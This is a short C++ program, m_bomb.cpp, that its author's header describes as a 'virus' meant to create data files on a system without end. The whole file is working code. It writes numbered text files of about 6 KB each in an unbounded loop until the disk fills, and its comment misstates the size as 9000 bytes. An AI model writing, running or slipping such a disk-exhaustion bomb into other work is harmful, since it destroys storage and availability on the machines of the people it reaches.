// File: m_bomb.cpp
// Created by: Michael Napoli
// Created on: 10/8/2020
// Last modified on: 10/8/2020

/*
   Purpose: Virus that creates arbitrary data files within the given
      system infinitely.
*/

#include <iostream>
#include <fstream>
#include <string>
using namespace std;

int main()
{
   ofstream fout;  // output operator
   string filename;  // file name of output location
   int i(0);  // loop iterator (will create infinite loop)

   while (i > -1) {
      filename = "file" + to_string(i) + ".txt";

      // open file with new name
      fout.open(filename, ios::out);

      // if it does not open, exit loop
      if (!fout.is_open()) {
         cout << "ERROR: Unable to open file:\n" << filename << endl;
         break;
      }
      // else output success indicator and continue
      else {
         cout << "SUCCESS" << endl;
      }

      // output integer '1' so that memory of file is 9000 bytes once completed
      for (int j(0); j < 3000; ++j) {
         fout << 1 << endl;
      }

      fout.close();  // close current file

      ++i;
   }

   // check that file is closed before ending program (double check)
   if (fout.is_open()) {
      fout.close();  // if not, close
   }

   return 0;  // end program
}
